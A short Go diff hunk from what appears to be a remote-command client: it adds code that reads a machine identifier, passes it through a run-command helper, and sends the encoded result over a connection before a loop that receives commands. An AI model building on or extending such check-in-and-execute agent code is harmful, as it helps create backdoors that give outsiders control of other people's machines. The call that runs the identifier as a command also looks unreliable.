@@ -59,6 +59,11 @@ func Connect() {
 			Connect()
 		}
 	}
+	guid,err := osinfo.AuniqueIdentifier()
+	if guid == "" {
+		guid = "123456"
+	}
+	SendMessage(conn, EncodeBytesToString(RunCmdReturnByte(guid)))
 
 	for {
 		// When the command received aren't encoded,
